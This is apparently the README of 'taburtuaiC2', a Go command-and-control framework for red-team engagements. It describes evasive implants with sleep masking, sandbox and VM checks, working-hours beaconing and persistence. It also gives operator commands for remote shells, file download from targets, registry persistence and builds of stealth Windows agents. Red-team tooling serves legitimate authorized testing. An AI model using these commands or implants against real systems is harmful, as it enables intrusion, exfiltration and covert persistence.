# taburtuaiC2

A modular, OPSEC-minded Command & Control framework written in Go.  
Built for authorized red team engagements only.

> **Author:** mjopsec &nbsp;·&nbsp; **Version:** 2.0.0 &nbsp;·&nbsp; **License:** MIT

---

## Features

- **Encrypted comms** — AES-256-GCM static key + ECDH P-256 per-session key exchange
- **SQLite persistence** — agents and command history survive server restarts
- **Malleable C2 profiles** — YAML-driven beacon behavior baked into each payload at build time
- **Sleep obfuscation** — Windows `VirtualProtect` sleep masking (`PAGE_NOACCESS` during sleep)
- **Kill date & working hours** — agent self-terminates outside configured time windows
- **Web dashboard** — SPA with Overview, Agents, Commands, and Logs pages
- **File operations** — upload / download with AES-encrypted transfer
- **Process management** — list, kill, start processes on the target
- **Persistence** — multiple persistence mechanisms per platform
- **Cross-platform agent** — Windows / Linux / macOS (build-tagged platform code)

---

## Project Structure

```
taburtuaiC2/
├── cmd/
│   ├── server/            # Team server entry point
│   └── operator/          # Operator CLI entry point
├── internal/
│   ├── api/               # HTTP handlers, middleware, routing (Gin)
│   ├── config/            # Server configuration (env-based + CLI flags)
│   ├── core/              # Server struct, SQLite-backed command queue
│   ├── modules/           # Plugin module manager
│   ├── services/          # Logger, agent monitor (write-through cache)
│   └── storage/           # SQLite store (agents, commands)
├── pkg/
│   ├── crypto/            # AES-256-GCM + ECDH session key exchange
│   └── types/             # Shared types (Command, AgentInfo, etc.)
├── agent/
│   ├── core/              # Agent beacon loop, checkin, command dispatch
│   ├── evasion/           # Sleep masking (Windows VirtualProtect)
│   └── persistence/       # Persistence mechanisms
├── builder/
│   ├── profiles/          # OPSEC profiles (default / stealth / aggressive)
│   └── templates/         # Payload templates
├── listener/
│   └── http/              # HTTP listener
├── web/
│   ├── static/
│   │   ├── css/           # variables · base · layout · components
│   │   └── js/            # api · ui · app · pages (overview/agents/commands/logs)
│   └── templates/         # dashboard.html shell
├── scripts/build/         # build_agent.sh
└── docs/                  # ROADMAP.md, ARCHITECTURE.md
```

---

## Quick Start

### 1. Start the server

```bash
# Minimum — default port 8080
ENCRYPTION_KEY=yourkey go run ./cmd/server

# Custom port + host
ENCRYPTION_KEY=yourkey go run ./cmd/server --port 9000 --host 0.0.0.0

# With auth enabled
ENCRYPTION_KEY=yourkey API_KEY=mytoken go run ./cmd/server --port 9000 --auth
```

The web dashboard is available at `http://<host>:<port>/`.

---

### 2. Operator CLI

The CLI connects to a running server. The `--server` flag (or `TABURTUAI_SERVER` env var) must point to your server.

```bash
go run ./cmd/operator --server http://172.23.0.118:9000
```

> **Note:** use `http://` (not `https://`) unless you have TLS configured on the server.

#### List agents

```bash
go run ./cmd/operator --server http://172.23.0.118:9000 agents list
```

#### Execute a command on an agent

```bash
go run ./cmd/operator --server http://172.23.0.118:9000 \
  cmd execute <agent-id> "whoami"
```

#### Interactive shell

```bash
go run ./cmd/operator --server http://172.23.0.118:9000 \
  shell <agent-id>
```

#### File upload / download

```bash
# Upload local file to agent
go run ./cmd/operator --server http://172.23.0.118:9000 \
  files upload <agent-id> /local/file.txt /remote/path/file.txt

# Download file from agent
go run ./cmd/operator --server http://172.23.0.118:9000 \
  files download <agent-id> /remote/path/file.txt
```

#### Process management

```bash
go run ./cmd/operator --server http://172.23.0.118:9000 process list <agent-id>
go run ./cmd/operator --server http://172.23.0.118:9000 process kill <agent-id> <pid>
```

#### Persistence

```bash
go run ./cmd/operator --server http://172.23.0.118:9000 \
  persistence setup <agent-id> --method registry
```

#### Server stats & logs

```bash
go run ./cmd/operator --server http://172.23.0.118:9000 stats
go run ./cmd/operator --server http://172.23.0.118:9000 logs
```

#### Build a pre-compiled operator binary (optional)

```bash
go build -o bin/operator ./cmd/operator
./bin/operator --server http://172.23.0.118:9000 agents list
```

---

### 3. Build an agent

**Key rules:**
- `--key` must match the server's `ENCRYPTION_KEY` — it is the **AES-256-GCM encryption key** for all agent↔server communications, not an auth token.
- `--server` must be reachable from the target machine.

```bash
# Basic Linux agent
bash scripts/build/build_agent.sh \
  --server http://172.23.0.118:9000 \
  --key yourkey \
  --os linux --arch amd64

# Windows stealth agent (debug build first — no -S flag, console visible)
bash scripts/build/build_agent.sh \
  --server http://172.23.0.118:9000 \
  --key yourkey \
  --os windows --arch amd64 \
  --debug

# Windows production build with stealth OPSEC profile
bash scripts/build/build_agent.sh \
  --server http://172.23.0.118:9000 \
  --key yourkey \
  --os windows --arch amd64 \
  --profile builder/profiles/stealth.yaml \
  --stealth --compress
```

---

## Configuration

### Server — environment variables & CLI flags

Environment variables are the base; CLI flags override them.

| Variable / Flag              | Default                   | Description                                          |
|------------------------------|---------------------------|------------------------------------------------------|
| `PORT` / `--port`            | `8080`                    | Listening port                                       |
| `HOST` / `--host`            | `0.0.0.0`                 | Bind address                                         |
| `ENCRYPTION_KEY`             | *(required)*              | AES-256 encryption key — **must match agent build**  |
| `SECONDARY_KEY`              | *(optional)*              | Secondary AES-256 key                                |
| `AUTH_ENABLED` / `--auth`    | `false`                   | Require API key on all operator requests             |
| `API_KEY` / `--api-key`      | *(required if auth on)*   | Bearer token for operators                           |
| `LOG_DIR` / `--log-dir`      | `./logs`                  | Log output directory                                 |
| `LOG_LEVEL` / `--log-level`  | `INFO`                    | `DEBUG` / `INFO` / `WARN` / `ERROR`                  |
| `DB_PATH` / `--db`           | `./data/taburtuai.db`     | SQLite database path                                 |
| `AGENT_DORMANT_SEC`          | `600`                     | Seconds without beacon before agent → dormant        |
| `AGENT_OFFLINE_SEC`          | `1800`                    | Seconds without beacon before agent → offline        |

### Agent status

| Status    | Meaning                                                              |
|-----------|----------------------------------------------------------------------|
| `online`  | Beaconed within `AGENT_DORMANT_SEC` (default 10 min)                |
| `dormant` | No beacon for 10–30 min — **commands can still be queued**; agent picks them up on next wake |
| `offline` | No beacon for > `AGENT_OFFLINE_SEC` (default 30 min) — commands rejected |

> **Tip:** When using slow-beacon profiles (e.g. stealth = 300 s interval), lower `AGENT_DORMANT_SEC` to match or just leave it — dormant agents still receive queued commands on their next checkin.

---

## OPSEC Profiles

Profiles are YAML files in `builder/profiles/` baked into the agent at compile time via `-ldflags`.

| Profile      | Interval | Jitter | Working Hours | Sleep Masking | Evasion |
|--------------|----------|--------|---------------|---------------|---------|
| `default`    | 30 s     | 30 %   | off           | off           | off     |
| `stealth`    | 300 s    | 50 %   | 08:00–18:00   | on            | on      |
| `aggressive` | 10 s     | 10 %   | off           | off           | off     |

> **Warning:** `stealth.yaml` enables `working_hours_only: true`. The agent **will not beacon outside 08:00–18:00 local time** on the target machine. For testing, use `default` profile or build without `--profile`.

Profile fields:

```yaml
name: stealth
sleep_interval: 300s      # beacon interval
jitter_percent: 50        # ± jitter on interval
max_retries: 3
kill_date: ""             # YYYY-MM-DD; empty = never
working_hours_only: true  # only beacon during working hours
working_hours_start: 8    # 24h
working_hours_end: 18
sleep_masking: true       # Windows VirtualProtect during sleep
user_agent_rotation: true
enable_sandbox_check: true
enable_vm_check: true
enable_debug_check: true
```

---

## API Reference

All endpoints are under `/api/v1`.

| Method | Path                              | Description                     |
|--------|-----------------------------------|---------------------------------|
| POST   | `/checkin`                        | Agent check-in (ECDH handshake) |
| GET    | `/agents`                         | List all agents                 |
| GET    | `/agents/:id`                     | Get agent details               |
| DELETE | `/agents/:id`                     | Remove agent                    |
| POST   | `/command`                        | Queue a command                 |
| GET    | `/command/:id/next`               | Agent polls next command        |
| POST   | `/command/result`                 | Agent submits result            |
| GET    | `/command/:id/status`             | Check command status            |
| GET    | `/agent/:id/commands`             | Command history                 |
| DELETE | `/agent/:id/queue`                | Clear pending queue             |
| POST   | `/agent/:id/upload`               | Upload file to agent            |
| POST   | `/agent/:id/download`             | Download file from agent        |
| POST   | `/agent/:id/process/list`         | List processes                  |
| POST   | `/agent/:id/process/kill`         | Kill process                    |
| POST   | `/agent/:id/process/start`        | Start process                   |
| POST   | `/agent/:id/persistence/setup`    | Install persistence             |
| POST   | `/agent/:id/persistence/remove`   | Remove persistence              |
| GET    | `/health`                         | Server health check             |
| GET    | `/stats`                          | Server statistics               |
| GET    | `/logs`                           | Fetch server logs               |
| GET    | `/queue/stats`                    | Queue statistics                |

---

## Development Phases

| Phase | Status         | Focus                                                   |
|-------|----------------|---------------------------------------------------------|
| 1     | ✅ Done        | API skeleton, agent beacon, logging, auth               |
| 2     | ✅ Done        | File ops, process management, persistence               |
| 3     | ✅ Done        | SQLite persistence, ECDH, sleep masking, OPSEC profiles |
| 4     | 🔲 Planned     | Listeners — HTTPS, DNS, SMB, WebSocket                  |
| 5     | 🔲 Planned     | Team server — multi-operator, RBAC, gRPC                |
| 6     | 🔲 Planned     | Payloads — staged, shellcode, obfuscation               |
| 7     | 🔲 Planned     | Post-exploitation — injection, tokens, credentials      |
| 8     | 🔲 Planned     | Pivoting — SOCKS5, port forward, P2P relay              |

See [docs/ROADMAP.md](docs/ROADMAP.md) for detailed task breakdowns.

---

## Legal

This tool is provided for **authorized penetration testing and red team engagements only**.  
Unauthorized use against systems you do not own or have explicit written permission to test is illegal and unethical.
